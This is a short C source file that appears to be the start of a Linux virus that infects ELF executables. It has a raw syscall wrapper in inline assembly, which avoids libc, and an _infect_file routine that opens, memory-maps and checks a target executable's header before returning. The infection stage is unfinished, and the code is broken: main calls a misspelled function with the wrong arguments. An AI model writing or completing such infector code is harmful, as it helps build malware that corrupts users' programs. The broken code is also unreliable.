#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_SIZE 4096
#define PAGE_ROUND(arg) ((arg) % PAGE_SIZE ? 				\
			 (arg) / PAGE_SIZE + 1 : (arg) / PAGE_SIZE)

long _syscall_wrap(long number, ...)
{
	long resultvar;
	asm volatile (
	"movq %%rsi, 	%%rdi	\n\t"
	"movq %%rdx, 	%%rsi	\n\t"
	"movq %%rcx, 	%%rdx	\n\t"
	"movq %%r8, 	%%r10	\n\t"
	"movq %%r9, 	%%r8	\n\t"
	"movq 8(%%rsp),	%%r9	\n\t"
	"syscall		\n\t"
	: "=a" (resultvar)
	: "rax" (number)
	: "memory", "cc", "r11", "cx", "rdi", "rsi", "rdx", "r10", "r8", "r9");
	return resultvar;
}

int _infect_file(const char *target_path, char *body, size_t body_s)
{
	/* Open, mmap */
	int target_fd = _syscall_wrap(SYS_open, target_path, O_RDWR);
	if (target_fd == -1)
		return -1;
	struct stat statbuf;
	if (_syscall_wrap(SYS_fstat, target_fd, &statbuf) == -1)
		return -1;
	char *mem = _syscall_wrap(SYS_mmap, NULL, statbuf.st_size,
			          PROT_READ | PROT_WRITE, MAP_PRIVATE,
				  target_fd, 0);
	if (mem == MAP_FAILED)
		return -1;

	Elf64_Ehdr *e_hdr = mem;
	
	/* Check elf exec */
	if (  e_hdr->e_ident[EI_MAG0]  	^ ELFMAG0
	    | e_hdr->e_ident[EI_MAG1]  	^ ELFMAG1
	    | e_hdr->e_ident[EI_MAG2]  	^ ELFMAG2
	    | e_hdr->e_ident[EI_MAG3]  	^ ELFMAG3
	    | e_hdr->e_ident[EI_CLASS] 	^ ELFCLASS64
	    | e_hdr->e_type		^ ET_EXEC)
		return -1;


	return 0;
}

int main(int argc, char *argv[])
{
	__infect_file(argv[1]);
	return 0;
}
